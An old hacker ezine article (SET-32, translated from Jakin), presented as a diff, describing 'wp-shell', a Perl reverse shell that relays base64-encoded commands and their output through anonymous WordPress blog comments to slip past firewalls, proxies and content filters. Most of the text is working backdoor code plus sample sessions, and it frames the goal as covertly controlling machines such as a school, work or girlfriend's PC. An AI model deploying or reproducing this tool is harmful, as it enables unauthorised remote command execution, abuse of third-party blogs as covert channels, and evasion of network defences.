@@ -1,0 +1,563 @@
+-[ 0x09 ]--------------------------------------------------------------------
+-[ wpshell ]-----------------------------------------------------------------
+-[ by jakin ]--------------------------------------------------------SET-32--
+
+
+Este articulo se escribio en el n7 del ezine Jakin (el ultimo). Este ezine se 
+escribe integramente en euskera (y en C :>) y trata sobre seguridad informatica.
+Ha habido gente que ha lamentado no poder enterarse de nada asi que se nos ha 
+ocurrido seleccionar un articulo y traducirlo para SET.
+
+jakin
+
+
+WP-SHELL: un shell inverso (ab)usando WordPress
+-----------------------------------------------
+
+Hola soy Regexp Angelorum, en anteriores numeros de Jakin he escrito articulos
+con sobre programacion perl.
+
+En esta ocasion tratare un tema algo distinto: un shell inverso.
+Este tema este muy relacionado a las tecnicas de evasion de firewalls,
+grupos como THC ya sacaron papers sobre este tema:
+http://www.thc.org/papers/fw-backd.htm
+Por tanto el tema no es nuevo aunque en mi caso voy a proponer unas
+mejoras que espero resulten interesantes. El entorno que se propone
+es bastante hostil y sin embargo trato de demostrar que es posible saltarselo.
+Al final de este articulo va el codigo, un PoC mejorable pero que funciona.
+
+Escenario y objetivo
+--------------------
+
+El objetivo no es otro que controlar remotamente una maquina windows o linux.
+Podria ser el del curre, el de casa, o el de la novia xD.
+Pero esa maquina se encuentra protegida por un router (como poco) y un 
+firewall:
+
+   ______
+  / ____ \
+  ||    ||         _________      ______                                ____
+ _||____||_       /        /     /      \                              |    |
+| PC de la |<--->/firewall/<--->| router |<---->... Internet ... <---->| Yo |_
++_escuela__+    /________/       \______/                            |________|
+
+
+Condiciones
+-----------
+
+Vamos a suponer que el entorno es muy restrictivo respecto a la red:
+
+1-Desde fuera es imposible entrar en la red local, todos los puertos estan 
+  cerrados, no hay ni DMZ ni nada y por tanto no hay acceso hacia adentro. El
+  router no hace ninguna traduccion de direcciones o NAT.
+
+2-Es imposible entrar en el router. Ni desde fuera ni desde dentro, por tanto no
+  lo podemos administrar y añadir un NAT.
+
+3-El firewall no permite conexiones entrantes desde el exterior hacia adentro,
+  tiene una buena configuracion que no permite la apertura de cualquier puerto.
+  Los paquetes provenientes del exterior solo se aceptan si estan vinculados a
+  una conexion ya abierta.
+
+4-Desde el PC de la escuela (el que queremos controlar) no nos podemos conectar
+  a internet de forma directa; solo nos podemso conectar a traves de un
+  software proxy que hay en el firewall y solamente al puerto 80. No podemos
+  abrir otras conexiones por nuestra cuenta.
+
+5-Ese proxy tiene un filtro de contenido: codigo de programas, comandos shell,
+  y cualquier tipo de trafico sospechoso es denegado. Algo parecido al HIVE de
+  s21sec.
+
+6-Es mas: la IP del router es dinamica y cambia continuamente.
+
+¿Condiciones duras eh? por fortuna no suelen ser tan duras, generalmente en 
+las escuelas las medidas de seguridad son bastante irrisorias. Pues bien: es 
+posible gestionar esa maquina interna desde el exterior saltando todas esas 
+condiciones y medidas de seguridad. ¿Como es posible?
+
+Lo unico que tenemos a nuestro favor es que ese PC de la escuela lo podemos 
+controlar cuando estamos ante el (faltaria mas), y podemos instalar el 
+programa que queramos.
+Pero no podemos instalar cualquier programa de control remoto (VNC, pcanywhere,
+remote administrator,..) porque es imposible conectarnos a el desde el 
+exterior. Solo hay una salida, valga la expresion: el propio PC de la escuela 
+debe ser quien inicie la conexion hacia el exterior.
+
+De alguna forma el PC de la escuela debe conectarse como cliente a un programa 
+servidor del exterior; nosotros nos podemos conectar a ese servidor para asi 
+poder llegar hasta el objetivo a traves de el. En definitiva cambiamos el 
+sentido de la conexion, de eso se trata un shell inverso.
+
+Con esto no se dice nada nuevo, por eso tratare de ir mas alla.
+
+En los articulos sobre reverse-shell se suele decir que la maquina externa 
+debe estar controlada por el hacker. En muchos casos se propone que la maquina
+externa debe abrir un puerto tcp (o udp, o icmp, las posibilidades de tunelar 
+ya estan muy estudiadas) o incluso abrir una conexion p2p. Si el puerto es 
+menor de 1024 necesitaremos permisos de root.
+Pero ademas de eso puede que ese puerto sea inaccesible desde el PC de la 
+escuela. Recordemos que en la red de la escuela la salida a internet se hace en
+condiciones muy restrictivas: es imposible que el PC abra una conexion 
+directamente, y ademas cualquier tipo de comunicacion tunelada o sospechosa 
+sera filtrada por el proxy o firewall de nivel 7. El Pc de la escuela solo 
+puede navegar y punto.
+
+La salida: el shell anonimo WordPress
+-------------------------------------
+
+La solucion seria poder pasar los comandos y las respuestas a traves de la 
+web de alguna manera. Podemos colgar en una web comandos en un formato que el 
+programa cliente entiende para que este se los baje y los procese. Un sistema 
+muy comodo para colgar ordenes seria un weblog.
+
+La tecnica no es novedosa; es habitual utilizar servicios de internet para 
+colgar codigo (como las news) u ordenes (a traves de irc) aunque en esta 
+ocasion nos aprovecharemos de la gran difusion de aplicaciones de weblog. En 
+este caso es el muy popular WordPress aunque podria haber sido cualquier otro.
+
+Pero ojo: no se trata de colgar una ristra de ordenes para que se ejecuten en 
+modo batch. Lo que se intenta es crear un shell en el que se meta un comando y 
+se reciba la correspondiente respuesta.
+
+La base del funcionamiento es el siguiente:
+0.- Buscamos un Wordpress que permita post de comentarios anonimos
+1.- Usando el programa maestro posteamos un comando (tendra determinado ID).
+2.- El programa esclavo accede a la web y al comentario y ejecuta su contenido.
+3.- El programa esclavo recoge la salida y la postea como respuesta (con ID+1).
+4.- El programa maestro recoge la respuesta y la muestra por "pantalla" al
+    usuario.
+5.- El usuario mete un nuevo comando y este se postea en como nueva respuesta.
+6.- etc...
+
+Usariamos un unico programa que se puede ejecutar en modo maestro o en modo 
+esclavo. El esquema quedaria asi:
+
+  WP-SHELL en                                                      WP-SHELL en
+ MODO ESCLAVO                                                      MODO MAESTRO
+                                    +----www----+
+   ______   <---(2) Lectura comando-|           | <---(1) Posteo comando
+  / ____ \ (3) ejecucion            |           |                        +---+ 
+  ||    ||-(4)Respuesta comando --->|           |-(5)Lectura respuesta-->|   |
+ _||____||_                         |  blog     |                        |   |
+| PC de la |<--->...Internet...<--->| wordpress |<--->...Internet...<--->|   |
++_escuela__+                        +___________+                        +___+
+
+En el modo maestro, lo que el usuario ve es una especie de shell-prompt 
+(asincrono) en el que va metiendo comandos y recibiendo respuestas.
+Algo asi:
+
+wp-shell@http://host/?p=6 [0]> 
+wp-shell@http://host/?p=6 [0]> ls -l
+...
+
+
+/Ventajas y mejoras/
+
+¿Que ventajas tiene este shell inverso?
+
++ El PC de la escuela no tendra ningun problema, de eso se trataba.
++ La maquina en la que se cuelgan los comandos y respuestas no es nuestra y no
+  tiene nada que ver con nosotros.
++ Al mandarse ordenes a traves de web, pueden usarse formas anonimas de navegar
+  a traves de proxys o una wireless cualquiera.
++ Todos las ordenes y respuestas pueden cifrarse o codificarse (base64) para 
+  evadir los filtros de contenido. Con base64 el contenido sera [a-zA-Z0-9]+.
++ Se hace un uso "legal" de WordPress (posteos de comentarios), sin inyecciones
+  ni nada, por tanto da igual que el wordpress este actualizado.
++ La tecnica se puede aplicar con cualquier weblog, guestbook, etc...
+
+Mejoras:
++ Se puede mejorar para que el shell salte de un sitio a otro. al final de
+  una respuesta se podria meter una cadena para ir al siguiente lugar,
+  encadenando varios weblogs.
++ Se pueden desarollar codificaciones distinas a base64, o cifrados para evadir
+  filtros de nivel7 que se sepan el truco de la codificacion.
+
+
+/Desventajas/ 
+
+- Se precisa posteo anonimo: si no es posible postear de forma anonima basta 
+con mejorar el programa para que use un usuario valido.
+
+- Latencia: es probable que wordpress solo nos permita postear cada 15 segundos,
+cosa que se soluciona con tiempos de espera o saltando de un blog a otro.
+
+- No se puede repetir los mismos comandos, ya que Wordpress controla los POST 
+repetidos. Workaround: meter espacios en blanco o añadidos tipo " && echo OK".
+
+- El shell es "publico". Se puede usar cifrado en lugar de codificacion.
+
+Y a continuacion aqui va el codigo. Se puede mejorar aunque de todas formas
+esto no es mas que una PoC. Se ha probado localmente y funciona.
+
+
+-----------------------8<---------------------------------------------------------
+
+#!/usr/bin/perl -w
+
+# wp-shell.pl - Regexp - Jakin ezine 7
+# Un shell inverso al estilo del explicaddo en THC, en este caso
+# hace uso de weblogs y puede funcionar incluso en condiciones
+# muy desfavorables.
+# Este codigo se ejecuta como esclavo (en el pc que se quiere controlar)
+# o como maestro (el equipo desde el cual mandamos comandos).
+
+
+#  Modulos perl necesarios
+use MIME::Base64;
+use LWP::UserAgent;
+use HTTP::Request;
+use HTML::LinkExtor;
+use HTTP::Headers;
+use HTML::LinkExtor;
+use URI::URL;
+use HTTP::Request::Common qw(POST);
+
+# Aqui nombramos las variables que usaremos, por claridad mas que nada
+my $arana;              # cliente web
+my $cabeceras;          # Cabeceras del protocolo HTTP
+my $url;                # Objeto URL 
+my $peticion;           # Objeto HTTP request
+my $respuesta;          # Respuesta del servidor (pagina o error)
+my $direccion;          # Direccion destino
+my $contador = 0;       # Contador de comandos del shell
+my $prompt = "wp-shell";# Indetificador del shell
+my $agente = "wp-shell-/0.1";  # Web zerbitzariari bidalitako nabigatzaile 
+                                 izena
+my $referer = "http://www.jakin.tk";    # Web zerbitzariari bidalita url 
+                                          jatorria
+my $identrada;          # Identificador de entrada de wordpress para meter los 
+                          comentarios (ordenes)
+my $modua = "";         # Modo del shell: maestro o esclavo
+my $direccion_post = "";# URL para meter los comentarios por metodo POST
+
+# Argumentos
+if ($#ARGV < 0  ) {
+    printf("Numero de argumentos erroneo, se precisa una url \n");
+    die("Uso \n ./wp-shell.pl http://wordpresslog/?p=num [maestro] 
+    [idcontador] [prompt]");
+} else {
+        $direccion = $ARGV[0];
+        @temp = split(/\?p=/, $ARGV[0]);
+        $identrada = $temp[1];
+        @temp = split(/\?/, $ARGV[0]);
+        $direccion_post = $temp[0] . "wp-comments-post.php";
+        $contador = (defined($ARGV[2]))?$ARGV[2]:0;
+        $modua = (defined($ARGV[1]))?$ARGV[1]:0;
+        $prompt = "wp-shell";
+        printf("wp-shell - OK direccion $direccion e id $identrada\n");
+}
+
+
+# Si se invoca el modo maestro ejecutamos su funcion
+if ($modua eq "maestro") {
+	&maixu();
+}
+
+my $resultadoesclavo = "";
+my $comando = "";
+
+
+# Si no entramos en modo maestro, funciona como esclavo
+# codigo del esclavo
+while (1) {
+
+    $comando = "";
+    print "[A la espera... ]\n";
+    $resultadoesclavo = &descargar($direccion);
+    $comando = &busqueda($resultadoesclavo, $contador, "http://" . $prompt . 
+    ".com/");
+
+    if ( $comando ne "") {
+       print "Comando solicitado: [$comando] " . descodificar($comando) . "\n";
+       $resultadoesclavo = ejecutar(descodificar($comando));
+       print "\033[0;36;40m $resultadoesclavo \033[0m";
+       print "[OK, ahora posteare el output en wordpress. Espera un poco]\n";
+       sleep(15);
+       &post("Esclavo","jlrzapatero\@presidencia.gob.es","http://cliente". 
+              $prompt. ".com/". $contador   , codificar($resultadoesclavo));
+       $contador++;
+    } else {
+       print "\n[No hay nuevos comandos...] \n";    
+       sleep(5);
+    }
+
+}
+
+
+##############################################
+################ SUBRUTINAS ###############
+##############################################
+
+## Si ejecutamos en modo maestro...
+sub maixu {
+
+	print "Wordpress SHELL, para salir escribe 'exit'.\n";
+	my $comando = "";
+	my $resultado = "";
+        my $resultado_post = "";
+        my $cont = 0;	
+
+	while (1) {
+         print "\n\033[0;35;40mwp-shell\@$direccion [".$contador."]> \033[0m";
+	 $comando = <STDIN>;
+	 chomp($comando); 
+	 if ($comando eq "exit") {
+		exit(0);
+	 } else {
+		$resultado_post = &post("Maestro","jlrzapatero\@presidencia.gob.es","http://". $prompt. ".com/". $contador  , codificar($comando));
+                        
+                 # Si el comando esta repetido, se avisa
+                   if ($resultado_post =~ /duplicate/i ) {
+                   print " Comando replicado escribe de otra forma o con espacios en blanco\n";
+                             next;
+                        }
+
+                        # Si Wordpress responde que vamos rapido
+                        if ($resultado_post =~ /cowboy/i) {
+                             print " [A dormir, vamos muy rapido]\n zz..zzzZZZZ...\n";
+                             sleep(10);
+                             next;
+                        }
+
+
+                        # Esperamos alguna respuesta
+                        while( $resultado eq "" && $cont <6) {
+					  			  $resultado = &descargar($direccion);
+                          
+		   	  $resultado = &busqueda($resultado, $contador, "http://cliente" . $prompt . ".com/");
+                          if ( $resultado ne "") {
+                            $_ = $resultado;
+                            
+								    # Los <br/> introducidos por Wordpress hay que quitarlos
+        						    $resultado =~ s#<br/>##g;
+		     				       print "\033[0;36;40m". descodificar($resultado) ."\033[0m";
+                          } else {
+                            $resultado = "";
+                          }
+                            sleep(5);
+                            $cont++;
+                        }
+                        $resultado = "";
+                        $contador++;
+                        $cont = 0;   
+		}
+	}
+}
+
+
+## descargar
+# descarga una pagina web solicitada
+sub descargar {
+
+        my ($helburu_url) = @_;
+
+	# Creamos la araña o user-agent web
+	$cabeceras = new HTTP::Headers(Accept => 'text/plain');
+
+	$url = new URI::URL($helburu_url);
+	$peticion = new HTTP::Request(GET, $url, $cabeceras);
+	$peticion->referer($referer);
+	$arana = new LWP::UserAgent;
+	$arana->agent($agente);
+	$respuesta = $arana->request($peticion);
+
+	print "wp-shell> GET $helburu_url ...\n";
+
+	## Respuesta del servidor
+	if ($respuesta->is_success) {# en caso de tener exito
+        	print "wp-shell> Respuesta del servidor: \n";
+	        return $respuesta->content;
+	} else { # en caso contrario
+	        return $respuesta->message; # Sal de la funcion
+	}
+
+}
+
+# Busqueda de determinado comentario en el blog
+# Esta funcion es crucial y si varia el formato de XHTML de wordpress
+# habria que ajustarla
+sub busqueda {
+	my ($html, $cont, $clave) = @_;
+	my $resultado1 = "";
+	my $resultado2 = "";
+	$clave = $clave . $cont;
+
+	print "Buscando cadena [".$cont. "[" . $clave . "]" . $prompt ."]\n";
+	$_ = $html;
+
+        s/\s//g;
+	($resultado1,$resultado2) = m#${clave}(.*?)<p>\s*(.*?)\s*</p>#m;
+
+	if ( defined($resultado2) && $resultado2 ne "") {
+	  print "Resultado: [" . $resultado1 . "] y ["  . $resultado2 . "]\n";
+          return $resultado2;
+        } else {
+          return "";
+        }
+
+}
+
+# Funcion para postear comentarios en el BLOG
+sub post {
+        my ($author, $email, $url, $comment) = @_;
+			my $content = "";
+
+        print "\nVamos alla " . $direccion_post . " \n";
+        $ua = LWP::UserAgent->new();
+        my $req = POST $direccion_post,[ author => $author, email => $email, url => $url, comment => $comment , comment_post_ID => $identrada];
+        $content = $ua->request($req)->as_string;
+        print "\nRespuesta\n " . $content . " \n";
+        return $content;
+}
+
+
+# Funcion para ejecutar los comandos que retorna el resultado
+sub ejecutar {
+       my ($comando_solicitado) = @_;
+       my $output_comando = "";
+
+       print "[Comando solicitado: $comando_solicitado ]\n";
+
+       open(COMANDO,"$comando_solicitado|");
+       while(<COMANDO>) {
+        $output_comando .= $_;
+       }      
+       close(COMANDO);
+       return $output_comando;
+
+}
+
+
+# Funcion de codificacion, en este caso se usa base64
+sub codificar {
+        my ($contenido) = @_;
+        return MIME::Base64::encode($contenido);
+}
+
+# Funcion de decodificacion
+sub descodificar {
+        my ($contenido) = @_;
+        return MIME::Base64::decode($contenido);
+}
+
+-----------------------8<---------------------------------------------------------
+
+[Lo que veriamos en la parte MASTER]
+
+linux# ./wp-shell.pl http://10.0.0.3/wordpress/?p=6 master
+wp-shell - OK direccion http://10.0.0.3/wordpress/?p=6 e id 6
+Wordpress SHELL, para salir escribe 'exit'
+
+wp-shell@http://10.0.0.3/wordpress/?p=6 [0]> ls -lh
+
+Goazen http://10.0.0.3/wordpress/wp-comments-post.php
+
+Respuesta
+ HTTP/1.1 302 Found
+Cache-Control: no-cache, must-revalidate, max-age=0
+Connection: close
+Date: Tue, 26 Jul 2005 22:15:49 GMT
+Pragma: no-cache
+Location:
+Server: Apache/1.3.33
+Content-Type: text/html; charset=iso-8859-1
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Last-Modified: Tue, 26 Jul 2005 22:15:50 GMT
+Client-Date: Tue, 26 Jul 2005 22:15:50 GMT
+Client-Peer: 10.0.0.3:80
+Client-Response-Num: 1
+Client-Transfer-Encoding: chunked
+Set-Cookie: comment_author_9c7065c5618d551217189566c54a1f30=Maixua; expires=Sun, 09 Jul 2006 03:35:50 GMT; path=/wordpress/
+Set-Cookie: comment_author_email_9c7065c5618d551217189566c54a1f30=jlrzapatero%40presidencia.gob.es; expires=Sun, 09 Jul 2006 03:35:50 GMT; path=/wordpress/
+Set-Cookie: comment_author_url_9c7065c5618d551217189566c54a1f30=http%3A%2F%2Fwp-shell.com%2F0; expires=Sun, 09 Jul 2006 03:35:50 GMT; path=/wordpress/
+
+
+wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
+wp-shell> Respuesta del servidor:
+[Buscando cadena 0[http://clientewp-shell.com/0]]
+wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
+wp-shell> Respuesta del servidor:
+[Buscando cadena 0[http://clientewp-shell.com/0]]
+wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
+wp-shell> Respuesta del servidor:
+[Buscando cadena 0[http://clientewp-shell.com/0]]
+wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
+wp-shell> Respuesta del servidor:
+[Buscando cadena 0[http://clientewp-shell.com/0]]
+wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
+wp-shell> Respuesta del servidor:
+[Buscando cadena 0[http://clientewp-shell.com/0]]
+Emaitza: ['rel='externalnofollow'>Bezeroa</a></cite>Says:<br/><smallclass="commentmetadata"><ahref="#comment-84"title="">July27th,2005at12:16am</a></small>] eta [dG90YWwgMjBLCi1ydy1yLS1yLS0gIDEgcm9vdCByb290IDcuOUsgSnVsIDI1IDEyOjIwIHRlc3Qu<br/>aHRtbAotcnd4ci14ci14ICAxIHJvb3Qgcm9vdCAgOTg1IEp1bCAyNSAxMjo0OCB0ZXN0LnBsCi1y<br/>d3hyLXhyLXggIDEgcm9vdCByb290IDcuMUsgSnVsIDI3IDAwOjExIHdwLXNoZWxsLnBsCg==]
+total 20K
+-rw-r--r--  1 root root 7.9K Jul 25 12:20 test.html
+-rwxr-xr-x  1 root root  985 Jul 25 12:48 test.pl
+-rwxr-xr-x  1 root root 7.1K Jul 27 00:11 wp-shell.pl
+
+wp-shell@http://10.0.0.3/wordpress/?p=6 [1]>
+
+
+
+
+[LO QUE VERIAMOS EN LA PARTE CLIENTE]
+
+linux# ./wp-shell.pl http://10.0.0.3/wordpress/?p=6 bezero
+wp-shell - OK helburua http://10.0.0.3/wordpress/?p=6 eta id 6
+Post helbidea:  http://10.0.0.3/wordpress/wp-comments-post.php
+[A la espera... ]
+wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
+wp-shell> Respuesta del servidor:
+[0[http://wp-shell.com/0]]
+
+[No hay nuevos comandos...]
+
+[A la espera... ]
+wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
+wp-shell> Respuesta del servidor:
+[0[http://wp-shell.com/0]]
+Emaitza: ['rel='externalnofollow'>Maixua</a></cite>Says:<br/><smallclass="commentmetadata"><ahref="#comment-83"title="">July27th,2005at12:15am</a></small>] eta [bHMgLWxo]
+Eskatutakoa: [bHMgLWxo] ls -lh
+[Pasatutakoa: ls -lh ]
+ total 20K
+-rw-r--r--  1 root root 7.9K Jul 25 12:20 test.html
+-rwxr-xr-x  1 root root  985 Jul 25 12:48 test.pl
+-rwxr-xr-x  1 root root 7.1K Jul 27 00:11 wp-shell.pl
+ [OK, orain emaitza wordpress-en idatziko dut. egon pixkat]
+
+Goazen http://10.0.0.3/wordpress/wp-comments-post.php
+
+Erantzuna
+ HTTP/1.1 302 Found
+Cache-Control: no-cache, must-revalidate, max-age=0
+Connection: close
+Date: Tue, 26 Jul 2005 22:16:09 GMT
+Pragma: no-cache
+Location:
+Server: Apache/1.3.33 
+Content-Type: text/html; charset=iso-8859-1
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Last-Modified: Tue, 26 Jul 2005 22:16:10 GMT
+Client-Date: Tue, 26 Jul 2005 22:16:10 GMT
+Client-Peer: 10.0.0.3:80
+Client-Response-Num: 1
+Client-Transfer-Encoding: chunked
+Set-Cookie: comment_author_9c7065c5618d551217189566c54a1f30=Bezeroa; expires=Sun, 09 Jul 2006 03:36:10 GMT; path=/wordpress/
+Set-Cookie: comment_author_email_9c7065c5618d551217189566c54a1f30=jlrzapatero%40presidencia.gob.es; expires=Sun, 09 Jul 2006 03:36:10 GMT; path=/wordpress/
+Set-Cookie: comment_author_url_9c7065c5618d551217189566c54a1f30=http%3A%2F%2Fbezerowp-shell.com%2F0; expires=Sun, 09 Jul 2006 03:36:10 GMT; path=/wordpress/
+
+
+[A la espera... ]
+wp-shell> GET http://10.0.0.3/wordpress/?p=6 ...
+wp-shell> Respuesta del servidor:
+[1[http://wp-shell.com/1]]
+
+[No hay nuevos comandos...]
+
+
+
+Por hoy es suficiente.
+
+die("hasta otra");
+
+					-Regexp Angelorum-
+*EOF*
